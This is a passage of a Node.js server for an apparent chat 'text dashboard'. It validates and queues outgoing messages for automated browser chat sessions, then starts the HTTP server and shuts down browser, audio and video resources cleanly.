   if(typeof b.text!=='string'||!b.text.trim()||b.text.length>4000)throw new Error('Write a message of 1–4000 characters.');
   const current=await s.page.evaluate(()=>window.__textHost?.status());if(!current?.connected||b.epoch!==current.epoch)throw new Error('The conversation changed. Wait for the new chat before sending.');
   relay.update(i,current);transcripts[i].reset(current.epoch);if(relay.members[i].queue.length>=40)throw new Error('Message queue is full. Wait before sending again.');const item=transcripts[i].add('private',b.text,'queued');relay.enqueue(i,{text:b.text,kind:'private',transcriptId:item.id});
  }
  return json(res,200,{ok:true});
 }catch(e){if(operation!=='connect')operationError(i,e);throw e;}finally{locks[i]=null;}
 }catch(e){json(res,400,{error:safeError(e)});}});
server.listen(Number(process.env.PORT||3000),'0.0.0.0',()=>console.log('Nekto text dashboard ready'));
async function shutdown(){relay.toggle(false);await audio.shutdown();await video.shutdown();await videoBrowser?.close().catch(()=>{});for(const s of slots)if(s)await s.context.close().catch(()=>{});await browser?.close().catch(()=>{});server.close(()=>process.exit(0));}
process.on('SIGTERM',shutdown);process.on('SIGINT',shutdown);
